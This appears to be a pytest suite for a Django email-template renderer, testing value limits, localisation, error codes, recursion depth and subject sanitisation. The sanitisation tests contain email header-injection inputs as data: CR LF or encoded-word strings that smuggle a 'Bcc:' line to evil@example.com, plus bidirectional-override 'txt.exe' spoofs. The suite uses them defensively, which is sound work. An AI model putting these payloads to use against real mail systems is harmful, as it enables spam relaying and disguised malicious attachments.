def test_a_required_path_null_for_this_item_is_the_values_and_one_never_set_the_templates(
    plain: Any, kit: Any, values: dict[str, Any], lacking: list[tuple[str, str]],
) -> None:
    """Where the path stops decides: at a key present and null, here or above it, the item has no value (skip it);
    at a key the values do not set, the template asks for something the sender never gives. An empty string prints
    nothing and an empty, absent or null list loops no item: neither is missing."""

    del plain
    template = _mail("{{ question.asked_by.name }}{% for item in items %} {{ item.name }}{% endfor %}.", REQUIRED)
    if not lacking:
        assert "None" not in _render(template, values, kit).plain_text
        return
    with pytest.raises(ValidationError) as refusal:
        _render(template, values, kit)
    assert [(item.messages[0], item.code, item.params[REFUSAL_SOURCE]) for item in refusal.value.error_list] == [
        (f"{path} is required and missing or null.", INVALID_VALUES, whose) for path, whose in lacking]


def test_variables_caps(plain: Any) -> None:
    """q1, q2, q6: a row declares at most 50 paths of 8 segments; ``D`` is one set; prepare() bounds the values."""

    del plain
    assert any("at most 50" in message for message in _refusals(_unsaved(
        source="x", variables={f"v{index}": "x" for index in range(51)})))
    assert any("more than 8" in message for message in _refusals(_unsaved(
        source="x", variables={"a.b.c.d.e.f.g.h.i": "x"})))
    _row("layout", "order", variables={"order": "x"})
    assert any("is declared and so is order.total" in message for message in _refusals(_unsaved(
        source="x", layout="order", variables={"order.total": "x"})))
    wide = _walk(_unsaved(source="{% for i in items %}{{ i.k00|default:'' }}{% endfor %}",
                          variables={f"items.*.k{index:02}": "x" for index in range(50)}))
    with _within(0.5):
        filled = wide.prepare({"items": [{} for _ in range(500)]})
    assert len(filled["items"]) == 500 and filled["items"][0]["k49"] == ""
    walk = _walk(_unsaved(source="{% for i in items %}{{ i }}{% endfor %}", variables={"items.*": "x"}))
    for values, refusal in (
        ({"items": [0] * 501}, "501 list items"),
        ({"items": ["x" * 10_001]}, "over 10000 characters"),
        ({"items": ["x" * 9_000] * 6}, "characters of JSON"),
    ):
        with pytest.raises(ValidationError, match=refusal):
            walk.prepare(values)


def test_subject_preheader_and_plain_text(plain: Any, kit: Any) -> None:
    """Property 6: one line each; a value's markup is escaped in the title; the plain text holds values as they are."""

    del plain
    template = _mail("Hi {{ name }}.", {"name": "x"}, subject="{{ name }}\nsecond line\tend",
                     preheader="{{ name }}\nmore")
    rendered = _render(template, {"name": "<b>Ana</b>"}, kit)
    assert rendered.subject == "<b>Ana</b> second line end" and rendered.preheader == "<b>Ana</b> more"
    assert "<title>&lt;b&gt;Ana&lt;/b&gt; second line end</title>" in rendered.html
    assert "Hi <b>Ana</b>." in rendered.plain_text
    assert "more" not in rendered.plain_text and "{" not in rendered.plain_text


def test_written_past_clean_fails_the_render_before_it_renders(plain: Any, kit: Any) -> None:
    """Property 8: a broken row, a cycle or a broken kit seed fails render() with ValidationError; preview says so."""

    del plain
    broken = _mail("{{ x|safe }}")
    with pytest.raises(ValidationError, match="does not compile"):
        _render(broken, {}, kit)
    _row("part", "cycle", source='{% include "parts/cycle" only %}')
    cyclic = _mail('{% include "parts/cycle" only %}', key="tests.cycle")
    with pytest.raises(ValidationError, match="includes itself"):
        _render(cyclic, {}, kit)
    with system_context(reason="tests.messaging_templates.render.preview"):
        preview = cyclic.preview(kit=kit)
    assert preview.rendered is None and [warning.code for warning in preview.warnings] == [
        TemplateWarningCode.RENDER_ERROR]
    fine = _mail("Fine.", key="tests.fine")
    with system_context(reason="tests.messaging_templates.render.seed"):
        BrandKit.objects.filter(pk=kit.pk).update(brand="#zzzzzz")  # seven characters, as PostgreSQL's column holds
        stale = BrandKit.objects.get(pk=kit.pk)
    with pytest.raises(ValidationError):
        _render(fine, {}, stale)


def test_no_default_kit_refuses_the_render(plain: Any) -> None:
    del plain
    fine = _mail("Fine.")
    with system_context(reason="tests.messaging_templates.render.kit"):
        BrandKit.objects.filter(is_default=True).update(is_default=False)
    with pytest.raises(ValidationError, match="No brand kit is the default"):
        _render(fine, {})


def test_an_override_saved_between_two_renders_shows_in_the_second(plain: Any, kit: Any) -> None:
    del plain
    shipped = _row("part", "word", source="First.", is_baseline=True)
    template = _mail('{% include "parts/word" only %}')
    assert "First." in _render(template, {}, kit).plain_text
    with system_context(reason="tests.messaging_templates.render.edit"):
        override = MessageTemplate.objects.override(shipped)
        override.source = "Second."
        override.save()
    assert "Second." in _render(template, {}, kit).plain_text


@pytest.mark.parametrize(
    ("language", "date", "direction"),
    [
        ("en", "Nov. 24, 2026", "ltr"),
        ("es", "24 de noviembre de 2026", "ltr"),
        ("de", "24. November 2026", "ltr"),
        ("ar", "24 نوفمبر، 2026", "rtl"),
        ("he", None, "rtl"),
        ("fa", None, "rtl"),
        ("tlh", None, "ltr"),  # a language parties stores and Django does not know: left to right, as the HTML
    ],
)
def test_dates_numbers_and_direction_follow_the_rows_language(
    plain: Any, kit: Any, language: str, date: str | None, direction: str,
) -> None:
    """Property 9: each pass runs in the row's language; a date path takes a date or an aware datetime; the
    rendered message carries the direction its HTML's dir says."""

    del plain
    template = _mail("{{ when|date:'DATE_FORMAT' }}|{{ dir }}|{{ ok|yesno }}", {"when": "x", "ok": "x"},
                     language=language, key="tests.dated")
    rendered = _render(template, {"when": datetime.date(2026, 11, 24), "ok": True}, kit)
    assert (rendered.language, rendered.direction) == (language, TextDirection(direction))
    assert f'dir="{direction}"' in rendered.html and f"|{direction}|" in rendered.plain_text
    if date is not None:
        assert rendered.plain_text.startswith(date)


def test_cheap_filters_spend_a_constant_and_a_raw_number_is_text(plain: Any, kit: Any) -> None:
    """A subject and preheader showing snippets of one long value fit their budget: default, length and yesno read
    nothing. A number too large for a float is refused only where floatformat or pluralize reads it."""

    del plain
    message = "word " * 2_000
    snippets = _mail(
        "Body.", {"name": "x", "message": "x"}, key="tests.snippets",
        subject="{{ name }}: {{ message|default:''|truncatechars:40 }}{% if message|length > 40 %}!{% endif %}",
        preheader="{{ message|default:''|truncatechars:90 }}",
    )
    rendered = _render(snippets, {"name": "Ana", "message": message}, kit)
    assert rendered.subject.startswith("Ana: word") and rendered.subject.endswith("!")
    raw = _mail("Order {{ number }}.", {"number": "x"}, key="tests.huge")
    for number in (2 ** 60, 10 ** 308, 10 ** 309, float("inf")):
        assert _render(raw, {"number": number}, kit).plain_text.startswith("Order ")


def test_the_markdown_pass_reads_internals_markdown_it_still_has() -> None:
    """The guard a markdown-it-py upgrade runs: the manifest caps it below 5, and these are what the pass reads."""

    assert markdown_it.__version__.split(".")[0] == "4"
    assert str(inspect.signature(parseLinkLabel)) == (
        "(state: markdown_it.rules_inline.state_inline.StateInline, start: int, disableNested: bool = False) -> int"
    )
    state = StateInline("x", MarkdownIt(), {}, [])
    for name in ("src", "pos", "posMax", "env", "md", "tokens"):
        assert hasattr(state, name), name
    assert list(inspect.signature(StateInline.push).parameters) == ["self", "ttype", "tag", "nesting"]
    assert list(inspect.signature(RendererHTML.renderToken).parameters) == ["self", "tokens", "idx", "options", "env"]
    parser = MarkdownIt("commonmark")
    for method in ("normalizeLink", "validateLink", "add_render_rule"):
        assert callable(getattr(parser, method)), method
    assert callable(parser.inline.ruler.before) and callable(parser.core.ruler.push)
    # The label-scan cap reads the block pass alone, before the inline pass runs.
    assert list(inspect.signature(parser.block.parse).parameters) == ["src", "md", "env", "outTokens"]
    tokens = parser.parse("# Title\n\n[a](https://example.test/) **b**\n")
    assert [token.type for token in tokens] == [
        "heading_open", "inline", "heading_close", "paragraph_open", "inline", "paragraph_close"]
    for name in ("type", "tag", "content", "info", "attrs", "children", "hidden", "map", "nesting"):
        assert hasattr(tokens[4], name), name
    assert [child.type for child in tokens[4].children or ()] == [
        "link_open", "text", "link_close", "text", "strong_open", "text", "strong_close", "text"]


def test_only_a_validation_error_leaves_render_and_preview(plain: Any, kit: Any) -> None:
    """Django review 2 (a3, a2, q7, q10): values the walk admits that Django's filters would raise on are refused,
    naming the path; a bare date printed with a time takes an aware datetime; preview reports each refusal as its
    own warning."""

    del plain
    numbers = _mail("[{{ n|pluralize }}][{{ n|floatformat:2 }}][{{ n|yesno }}][{{ n }}]", {"n": "x"}, key="tests.n")
    for number in (10 ** 400, -(10 ** 400), float("inf"), float("nan")):
        with pytest.raises(ValidationError, match="n is not a number a float holds"):
            _render(numbers, {"n": number}, kit)
    assert _render(numbers, {"n": 1e308}, kit).plain_text.startswith("[s]")
    printed = {"d": "DATETIME_FORMAT", "e": "H:i", "f": "TIME_FORMAT", "g": "SHORT_DATETIME_FORMAT"}
    timed = _mail("".join(f"[{{{{ {path}|date:'{name}' }}}}]" for path, name in printed.items()),
                  dict.fromkeys(printed, "x"), key="tests.timed")
    moments = dict.fromkeys(printed, "2026-11-24T10:00:00+00:00")
    assert _render(timed, moments, kit).plain_text.count("[") == 4
    for path, name in printed.items():
        with pytest.raises(ValidationError, match=f"{path} is printed with a time \\({name}\\)"):
            _render(timed, {**moments, path: "2026-11-24"}, kit)
    dated = _mail("[{{ d|date:'DATE_FORMAT' }}]", {"d": "x"}, key="tests.far")
    for moment in ("9999-12-31T23:59:59-23:59", "0001-01-01T00:00:00+23:59"):
        with pytest.raises(ValidationError, match="d is a moment the local time zone cannot hold"):
            _render(dated, {"d": moment}, kit)
    epoch = _mail("[{{ d|date:'U' }}]", {"d": "x"}, key="tests.epoch")
    for zone in ("UTC", "Pacific/Kiritimati"):
        for day in ("0001-01-01", "9999-12-31", "2026-11-24"):
            with timezone.override(zoneinfo.ZoneInfo(zone)):
                try:  # The contract: a refusal is a ValidationError, never another exception.
                    _render(epoch, {"d": day}, kit)
                except ValidationError:
                    pass
    with system_context(reason="tests.messaging_templates.render.preview"):
        timed.sample = {**moments, "d": "2026-11-24", "e": "2026-11-24"}
        preview = timed.preview(kit=kit)
    assert preview.rendered is None and [(warning.code, warning.field) for warning in preview.warnings] == [
        (TemplateWarningCode.RENDER_ERROR, None)] * 2
    assert [warning.detail.split(" (")[0] for warning in preview.warnings] == [
        "d is printed with a time", "e is printed with a time"]


@pytest.mark.parametrize("raised", [RuntimeError, ZeroDivisionError, ValueError])
def test_any_other_failure_is_logged_then_refused_as_render_failed(
    plain: Any, kit: Any, caplog: pytest.LogCaptureFixture, raised: type[Exception],
) -> None:
    """Section 4: what nobody thought of is logged as the row and the exception's type, never the exception's text
    or traceback, which may quote a value, then leaves as render_failed; preview says so."""

    del plain
    with failing_filter("upper", raised("a filter nobody thought of")):
        template = _mail("{{ name|upper }}", {"name": "x"}, sample={"name": "Ana"})
        with caplog.at_level(logging.ERROR, logger="angee.messaging_templates.walker"):
            with pytest.raises(ValidationError) as caught:
                _render(template, {"name": "Ana"}, kit)
            with system_context(reason="tests.messaging_templates.render.preview"):
                preview = template.preview(kit=kit)
        assert [item.code for item in caught.value.error_list] == [RENDER_FAILED]
        assert caught.value.messages == [f"The message template did not render: it raised {raised.__name__}."]
        assert preview.rendered is None
        assert preview.warnings == [TemplateWarning(TemplateWarningCode.RENDER_ERROR, caught.value.messages[0])]
        assert [(record.levelno, record.getMessage(), record.exc_info) for record in caplog.records] == [(
            logging.ERROR,
            f"A message template failed to render: the template {template.key} in en raised {raised.__name__}.",
            None,
    )] * 2


@pytest.mark.parametrize("raised", [MemoryError, RecursionError])
def test_running_out_of_room_is_not_a_refusal(
    plain: Any, kit: Any, raised: type[Exception],
) -> None:
    """MemoryError and RecursionError say the process ran out of room, not that the row cannot render."""

    del plain
    with failing_filter("upper", raised("a filter nobody thought of")), pytest.raises(raised):
        _render(_mail("{{ name|upper }}", {"name": "x"}), {"name": "Ana"}, kit)


def test_the_walk_and_the_warnings_are_inside_the_contract(
    plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Section 4: a failure in the walk or in the preview's warnings leaves as a refusal, never as itself."""

    del plain
    template = _mail("{{ name }}", {"name": "x"}, sample={"name": "Ana"})
    with monkeypatch.context() as patched:
        patched.setattr(_TreeWalker, "close", lambda walker, tree: 1 / 0)
        with pytest.raises(ValidationError) as caught:
            _render(template, {"name": "Ana"}, kit)
        assert [item.code for item in caught.value.error_list] == [RENDER_FAILED]
        with system_context(reason="tests.messaging_templates.render.preview"):
            assert template.preview(kit=kit).warnings[0].code == TemplateWarningCode.RENDER_ERROR
    monkeypatch.setattr(TemplateWalk, "unused", property(lambda walk: 1 / 0))
    with system_context(reason="tests.messaging_templates.render.preview"):
        preview = template.preview(kit=kit)
    assert preview.rendered is None and preview.warnings[0].code == TemplateWarningCode.RENDER_ERROR


def test_a_caller_tells_each_refusal_apart_by_its_code(
    plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Section 4: every item of a refusal carries its code in error_list, as the sending lane reads it."""

    del plain

    def codes(row: Any, values: dict[str, Any], kit: Any = kit) -> set[str | None]:
        with pytest.raises(ValidationError) as caught:
            _render(row, values, kit)
        return {item.code for item in caught.value.error_list}

    template = _mail("{{ order.total }} {{ name }}", {"order.total": "x", "name": "x"}, key="tests.codes")
    assert codes(template, {"order": "x"}) == {INVALID_VALUES}
    assert codes(template, {"order": {"total": None}, "name": None}) == {INVALID_VALUES}
    assert codes(_mail("{{ x|safe }}", key="tests.broken"), {}) == {MESSAGE_TEMPLATE_REFUSED}
    looping = _mail("{% for i in items %}" + "{{ i|upper }}{{ i|lower }}{{ i|title }}" * 2 + "{% endfor %}",
                    {"items.*": "x"}, key="tests.looping")
    assert codes(looping, {"items": ["a"] * 501}) == {INVALID_VALUES}
    assert codes(looping, {"items": ["a" * 90] * 500}) == {RENDER_BUDGET_EXCEEDED}
    long_subject = _mail("x", {"name": "x"}, key="tests.subject", subject="{{ name }}{{ name }}")
    assert codes(long_subject, {"name": "n" * 600}) == {SUBJECT_TOO_LONG}
    with failing_filter("upper", RuntimeError("a filter nobody thought of")):
        assert codes(looping, {"items": ["a"]}) == {RENDER_FAILED}
    with system_context(reason="tests.messaging_templates.render.kit"):
        BrandKit.objects.filter(pk=kit.pk).update(is_default=False)
    with pytest.raises(ValidationError) as caught, system_context(reason="tests.messaging_templates.render"):
        template.render({"order": {"total": 1}, "name": "Ana"})
    assert {item.code for item in caught.value.error_list} == {NO_BRAND_KIT}


def test_a_lone_surrogate_is_refused_as_invalid_values(plain: Any, kit: Any) -> None:
    """A value no mail can encode is refused in prepare(), never returned in a subject or raised from preview."""

    del plain
    template = _mail("Hello {{ name }}.", {"name": "x"}, subject="Hi {{ name }}")
    template.sample = {"name": "a\ud800b"}  # unsaved: PostgreSQL's jsonb refuses a lone surrogate
    with pytest.raises(ValidationError, match="lone surrogate") as caught:
        _render(template, {"name": "a\ud800b"}, kit)
    assert {item.code for item in caught.value.error_list} == {INVALID_VALUES}
    with system_context(reason="tests.messaging_templates.render.preview"):
        assert template.preview(kit=kit).warnings[0].code == TemplateWarningCode.RENDER_ERROR


def test_the_deepest_admitted_row_and_values_render(plain: Any, kit: Any) -> None:
    """Tags nested 16 deep in each of four rows, three includes, two loops, eight-segment paths and a condition of
    ten operators: the walk and the render stay far under Python's default recursion limit, so no RecursionError,
    which stays unconverted, can arise from a row."""

    del plain

    def nested(inner: str, depth: int = 16) -> str:
        return "\n".join(["{% if x %}"] * depth) + inner + "\n".join(["{% endif %}"] * depth)

    condition = "{% if " + "not " * CONDITION_OPERATOR_LIMIT + "x %}"
    for name, source in (("depth3", nested(condition + "{{ x }}{% endif %}", 15)),
                         ("depth2", nested('{% include "parts/depth3" with x=x only %}')),
                         ("depth1", nested('{% include "parts/depth2" with x=x only %}'))):
        _row("part", name, format="html", source=source, text_source=source, variables={"x": "x"})
    deep = "a.b.c.d.e.f.g.h"
    body = ("{% for o in outer %}{% for i in o.inner %}{% with x=i.v %}"
            + nested('{% include "parts/depth1" with x=x only %}', 13)
            + "{% endwith %}{% endfor %}{% endfor %}{{ " + deep + " }}")
    template = _mail(body, {"outer.*.inner.*.v": "x", deep: "x"}, format="html", text_source=body,
                     key="tests.deepest")
    assert _refusals(template) == []
    values: dict[str, Any] = {"outer": [{"inner": [{"v": "Deep"}] * 10}] * 10}
    node = values
    for segment in deep.split("."):
        node = node.setdefault(segment, {}) if segment != "h" else node.setdefault(segment, "Eight")
    base = len(inspect.stack(0))
    walked = _deepest(lambda: TemplateWalker(saving=True).walk(template, MessageTemplate.objects))
    rendered = _deepest(lambda: _render(template, values, kit))
    assert rendered[1].plain_text.count("Deep") == 100
    added = max(walked[0], rendered[0]) - base
    print(f"deepest admitted row: base {base} frames, walk {walked[0]}, render {rendered[0]}; "  # noqa: T201
          f"adds {added}, {sys.getrecursionlimit() - base - added} under the limit of {sys.getrecursionlimit()}")
    assert added < DEEPEST_ADDED_FRAMES


DEEPEST_ADDED_FRAMES = 300
"""The most Python frames the walk or the render of the deepest admitted row may add to its caller's."""


def _deepest(call: Callable[[], Any]) -> tuple[int, Any]:
    """The deepest Python stack ``call`` reaches, and what it returns."""

    peak = [0]

    def profile(frame: Any, event_name: str, argument: Any) -> None:
        del argument
        if event_name == "call":
            depth = 0
            while frame is not None:
                depth, frame = depth + 1, frame.f_back
            peak[0] = max(peak[0], depth)

    with system_context(reason="tests.messaging_templates.render.depth"):
        sys.setprofile(profile)
        try:
            result = call()
        finally:
            sys.setprofile(None)
    return peak[0], result


def test_a_condition_holds_at_most_ten_operators_each_a_node(plain: Any) -> None:
    """A chain of 240 nots cost 575 frames and was counted as one node: now refused past ten, each operator counted."""

    del plain
    refused = _unsaved(source="{% if " + "not " * 240 + "x %}{% endif %}", variables={"x": "x"})
    assert f"an if condition holds over {CONDITION_OPERATOR_LIMIT} operators" in " ".join(_refusals(refused))
    admitted = _unsaved("part", "ops", source="{% if not a and b or c == 'x' %}{% endif %}",
                        variables={"a": "x", "b": "x", "c": "x"})
    walk = TemplateWalker(saving=True).judge(admitted, _Rows(admitted))
    assert walk.refusals == []


def test_an_over_long_subject_is_refused_by_its_column_and_never_lexed(
    plain: Any, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Fix 1 (Django review 3): a column over its max_length refuses the row before the walk reads it."""

    del plain
    checked: list[Any] = []
    _recording(monkeypatch, TemplateWalker, "check", lambda walker, row: checked.append(row))
    row = _unsaved(subject="{{ a }}" * 7_000, preheader="x" * 50_000, variables={"a": "x"})
    with system_context(reason="tests.messaging_templates.render.clean"), pytest.raises(ValidationError) as raised:
        row.full_clean()
    assert {"subject", "preheader"} <= set(raised.value.message_dict) and checked == []


def test_the_values_cap_counts_characters_not_escapes(plain: Any) -> None:
    """Fix 2 (Django review 4): 50,000 characters of JSON, whatever the script; escapes are not counted."""

    del plain
    walk = _walk(_unsaved(source="{% for i in items %}{{ i }}{% endfor %}", variables={"items.*": "x"}))
    assert len(walk.prepare({"items": ["名" * 9_000] * 5})["items"]) == 5
    assert len(walk.prepare({"items": ["😀" * 9_000] * 5})["items"]) == 5
    with pytest.raises(ValidationError, match="characters of JSON"):
        walk.prepare({"items": ["名" * 9_000] * 6})


def test_subject_and_preheader_drop_control_and_bidirectional_characters(plain: Any, kit: Any) -> None:
    """Fix 3 (Django review 8, i5): NUL, C0 and C1 controls and bidi overrides never reach a header line."""

    del plain
    template = _mail("Hi.", {"name": "x"}, subject="Hi {{ name }}", preheader="{{ name }}")
    rendered = _render(template, {"name": "a\x00b\x1b[1m\u202eevil\u202c\u2066x\u2069\x85c\x9fd\r\nBcc: e"}, kit)
    assert rendered.subject == "Hi ab[1mevilxcd Bcc: e" and rendered.preheader == "ab[1mevilxcd Bcc: e"


ENCODED_WORDS = [
    "Invoice =?utf-8?q?=E2=80=AEtxt.exe?= ready", "Hi =?utf-8?b?4oCudHh0LmV4ZQ==?=", "=?utf-8?b?4oCuZXZpbA==?= invoice",
    "plain =?utf-8?q?a=E2=80=AEb?= tail", "abc=?utf-8?q?=E2=80=AE?=def", "Héllo =?utf-8?q?=E2=80=AE?=x",
    "a =?UTF-8?Q?=E2=80=AE?= b", "a =?UTF-8?B?4oCu?= b", "a =?x-nope?q?=E2=80=AE?= b", "a =?utf-8*en?q?=E2=80=AE?= b",
    "a =?utf-8?q?=E2=80=AE b", "a=?utf-8?q?=E2=80=AE?=", "a =??q?=E2=80=AE?= b",
    "a =?utf-8?q?=E2=80?= =?utf-8?q?=AE?= b", "Hi =?utf-8?q?a=0D=0ABcc:_evil@example.com?= there",
    "=?us-ascii?q?plain?=", "x =?utf-8?q?=00?= y", "x =?utf-8?q?=1B[31m?= y", "=?=?utf-8?b?4oCu?=",
]
"""Spellings CPython's header machinery decodes when it takes a subject: a word terminated or not, at the start, in
the text or inside a word, base64 or Q in either case, an empty, unknown or language-tagged charset, two adjacent
words, an encoded CR LF before a Bcc:, a NUL, an escape sequence, an override."""
UNTOUCHED_SUBJECTS = ["2+2=? and more", "a = ?utf-8?q?=E2=80=AE?= b", "a =?utf-8?x?=E2=80=AE?= b", "Why =? Because"]
"""Subjects no mail library decodes, which the line rule leaves as they are."""


def _survives_the_mail_library(subject: str) -> None:
    """The standard library stores exactly ``subject`` when it takes it, and reads exactly it back from the wire."""

    message = EmailMessage(policy=email.policy.default)
    message["Subject"] = subject
    assert str(message["Subject"]) == subject, (subject, str(message["Subject"]))
    parsed = email.message_from_bytes(message.as_bytes(), policy=email.policy.default)
    assert str(parsed["Subject"]) == subject, (subject, str(parsed["Subject"]))


def test_a_subject_never_holds_an_encoded_word(plain: Any, kit: Any) -> None:
    """Every spelling a mail library decodes, in a value and in the row's own text, reaches the subject and the
    preheader with its opener broken, so the library stores the string as it is; what it does not decode stays."""

    del plain
    template = _mail("Hi.", {"v": "x"}, subject="{{ v }} =?utf-8?q?=E2=80=AE?=", preheader="{{ v }}")
    for value in ENCODED_WORDS:
        rendered = _render(template, {"v": value}, kit)
        for line in (rendered.subject, rendered.preheader):
            assert not ENCODED_WORD_OPENER.search(line), line
            assert "\u202e" not in line and "\r" not in line and "\x00" not in line
            _survives_the_mail_library(line)
    for value in UNTOUCHED_SUBJECTS:
        assert _render(template, {"v": value}, kit).preheader == value


_OPENED = st.builds(
    lambda before, charset, marker, body, after: f"{before}=?{charset}?{marker}?{body}{after}",
    st.sampled_from(["", "a ", "a", "Hi =?", "2+2=? "]),
    st.sampled_from(["utf-8", "UTF-8", "", "x-nope", "utf-8*en", "us-ascii", "iso-8859-1"]),
    st.sampled_from(["q", "Q", "b", "B"]),
    st.sampled_from(["=E2=80=AE", "4oCu", "a=0D=0ABcc:_x", "=00", "=1B[31m", "plain", "=E2=80=AE b"]),
    st.sampled_from(["?=", "?= tail", "?=x", "", " =?utf-8?q?=AE?="]),
)


@settings(deadline=None, max_examples=300, suppress_health_check=[HealthCheck.function_scoped_fixture])
@given(value=st.one_of(_OPENED, st.sampled_from(ENCODED_WORDS + UNTOUCHED_SUBJECTS), st.text(max_size=40)))
def test_a_subject_never_becomes_an_encoded_word(plain: Any, kit: Any, value: str) -> None:
    """Any value in a subject and a preheader survives the standard library's header machinery as it was rendered:
    stored exactly, and read back exactly from the wire."""

    del plain
    with system_context(reason="tests.messaging_templates.render.encoded"):
        template = MessageTemplate.objects.filter(key="tests.encoded").first() or _mail(
            "Hi.", {"v": "x"}, subject="Re {{ v }}", preheader="{{ v }}", key="tests.encoded")
    try:
        rendered = _render(template, {"v": value}, kit)
    except ValidationError:
        return  # a lone surrogate is refused
    _survives_the_mail_library(rendered.subject)
    _survives_the_mail_library(rendered.preheader)


def test_the_plain_text_body_never_reads_the_subject_or_the_preheader(plain: Any) -> None:
    """D3 (i4): subject and preheader are read in the HTML form alone, the one pass that supplies them."""

    del plain
    _row("layout", "subjected", source=PLAIN_LAYOUT,
         text_source="Subject: {{ subject }}\n\n{% block content %}{% endblock %}")
    for row in (_unsaved(layout="subjected"), _unsaved(subject="{{ preheader }}"), _unsaved(
            "layout", "other", source=PLAIN_LAYOUT, text_source="{{ preheader }}{% block content %}{% endblock %}")):
        assert any("read in the HTML form alone" in refusal for refusal in _refusals(row)), row.key
    assert _refusals(_unsaved()) == []


def test_a_date_path_parses_iso_strings_and_refuses_what_is_not_a_date(plain: Any, kit: Any) -> None:
    del plain
    template = _mail("{{ when|date:'Y-m-d' }}", {"when": "x"})
    assert _render(template, {"when": "2026-11-24"}, kit).plain_text.strip() == "2026-11-24"
    with timezone.override(zoneinfo.ZoneInfo("Europe/Berlin")):
        assert _render(template, {"when": "2026-11-24T23:30:00+00:00"}, kit).plain_text.strip() == "2026-11-25"
    for value, kind in (("2026-11-24T15:30:00", "text of 19 characters"), ("2026-02-30", "text of 10 characters"),
                        ("soon", "text of 4 characters"), (12, "a number"), (1.5, "a number"), (True, "true or false")):
        with pytest.raises(ValidationError) as refusal:
            _render(template, {"when": value}, kit)
        assert refusal.value.messages == [f"when is not a date, or a date and time with its offset: it is {kind}."]


# ---------- the probes, by name ----------


def test_filter_cost_caps(plain: Any, kit: Any) -> None:
    """p2, p13, q15: a long date format is refused at save, url reads 2,048 characters, every filter call charges."""

    del plain
    for refused in ("{{ d|date:'" + "r" * 21 + "' }}", "{{ d|date:'" + "r" * 190 + "_FORMAT' }}"):
        assert any("a date format" in message for message in _refusals(_unsaved(source=refused, variables={"d": "x"})))
    for admitted in ("{{ d|date:'" + "r" * 20 + "' }}", "{{ d|date:'SHORT_DATETIME_FORMAT' }}"):
        assert _refusals(_unsaved(source=admitted, variables={"d": "x"})) == []
    assert url("https://example.test/" + "é" * 2_030) == ""
    loop = _mail(
        "{% for i in items %}\n" + "\n".join(["{% with x=d|date:'rrrrrrrrrrrrrrrrrrrr' %}{% endwith %}" * 10] * 30)
        + "\n{% endfor %}",
        {"items.*": "x", "d": "x"}, format="html", text_source="x",
    )
    with _within(1.0):
        with pytest.raises(RenderBudgetExceeded):
            _render(loop, {"items": [0] * 500, "d": "2026-11-24T15:30:00+00:00"}, kit)


def test_condition_filters_refused(plain: Any) -> None:
    """p3: an if operand runs no filter but ``length``, so a condition costs nothing a budget does not see."""

    del plain
    for source in ('{% if v|url == "x" %}{% endif %}', '{% if w|truncatechars:9 == "x" %}{% endif %}',
                   "{% if v|default:'x' %}{% endif %}"):
        assert any("an if tests" in message for message in _refusals(_unsaved(
            source=source, variables={"v": "x", "w": "x"}))), source
    assert _refusals(_unsaved(source="{% if items|length > 2 %}{% endif %}", variables={"items.*": "x"})) == []


def test_wrapper_refuses_author_blocks(plain: Any) -> None:
    """p5: the layout column names the layout; a template writes neither extends nor block."""

    del plain
    for source in ("Hi{% endblock %} tail", "Hi{% endblock %}{% block x %}X", "{% block content %}Z{% endblock %}",
                   "A{% block inner %}B{% endblock %}C", '{% extends "layouts/plain" %}'):
        assert _refusals(_unsaved(source=source)), source
    for layout in ("<p>No content</p>", "{% block content %}x{% endblock %}",
                   "{% if lang %}{% block content %}{% endblock %}{% endif %}",
                   "{% block content %}{% endblock %}{% block other %}{% endblock %}"):
        assert any("a layout holds one empty" in message for message in _refusals(_unsaved(
            "layout", "other", source=layout, text_source=PLAIN_TEXT))), layout
    assert any("block is the layout's alone" in message for message in _refusals(_unsaved(
        "block", "b", source="{% block x %}{% endblock %}", text_source="x")))


def test_nesting_before_compile(plain: Any) -> None:
    """p6: tags nest at most 16 deep, counted on the tokens; 400 levels are refused before Django compiles them."""

    del plain
    sixteen = "\n".join(["{% if a %}"] * 16) + "x" + "\n".join(["{% endif %}"] * 16)
    assert _refusals(_unsaved(source=sixteen, variables={"a": "x"}, format="html", text_source="x")) == []
    deep = "\n".join(["{% if a %}" * 25] * 16) + "\nx\n" + "\n".join(["{% endif %}" * 25] * 16)
    with _within(0.5):
        refusals = _refusals(_unsaved(source=deep, variables={"a": "x"}, format="html", text_source="x"))
        assert any("nests tags over 16" in message for message in refusals)


def test_expression_shapes(plain: Any, kit: Any) -> None:
    """p7, q8: literals are strings or numbers; precision is parsed as floatformat parses it; filter arity holds."""

    del plain
    for source, refused in (
        ("{{ 5 }}{{ 1.5 }}{{ 'x' }}", False),
        ("{{ x|floatformat:' 7' }}", True),
        ("{{ x|floatformat:'1_000' }}", True),
        ("{{ x|floatformat:1e3 }}", True),
        ("{{ x|floatformat:'6g' }}", False),
        ("{{ x|linebreaksbr:'a' }}", True),
        # Rule 5 refuses what Django's filters raise on rather than refuse (Django review 2, p7, q8).
        ("{{ x|floatformat:'' }}", True),
        ("{{ x|floatformat:1e400 }}", True),
        ("{{ x|floatformat:'abc' }}", True),
        ("{{ x|truncatechars:1e400 }}", True),
        ("{{ x|truncatewords:'many' }}", True),
        ("{{ x|yesno:1 }}", True),
        ("{{ x|pluralize:2 }}", True),
        ("{{ 'x'|date:'U' }}", True),
        ("{{ lang|date:'U' }}", True),
        ("{% for i in items %}{{ forloop.counter|date:'U' }}{% endfor %}", True),
        ("{% with d=lang %}{{ d|date }}{% endwith %}", True),
        ("{{ x|date:'U' }}{% with d=x %}{{ d|date }}{% endwith %}", False),
        ("{{ x|yesno:'a,b' }}{{ x|pluralize:'es' }}{{ x|truncatechars:'5' }}{{ x|floatformat:'-2u' }}", False),
        ("{% with x as y %}{{ y }}{% endwith %}", False),
        ("{% for i in items reversed %}{{ i }}{% endfor %}", False),
        ("{% if x|length > 2 and not y or y not in 'abc' %}z{% endif %}", False),
    ):
        refusals = _refusals(_unsaved(source=source, variables={"x": "x", "y": "x", "items.*": "x"},
                                      format="html", text_source="x"))
        assert bool(refusals) is refused, (source, refusals)
    rendered = _render(_mail("{{ amount|floatformat:'2g' }}", {"amount": "x"}, language="de", key="tests.amount"),
                       {"amount": Decimal("1234.5")}, kit)
    assert rendered.plain_text.strip() == "1.234,50"


def test_line_caps_bound_lexing(plain: Any) -> None:
    """p8, p9, p15, q14c: what makes lexing or Markdown quadratic is refused before either runs."""

    del plain
    rows = {
        "unclosed": "{{" * 25_000,
        "brackets": ("[" * 999 + "\n") * 50,
        "images": (("![" * 499)[:999] + "\n") * 50,
        "long-line": "x" * 50_000,
    }
    for case, source in rows.items():
        with _within(0.2, case):
            assert _refusals(_unsaved(source=source)), case
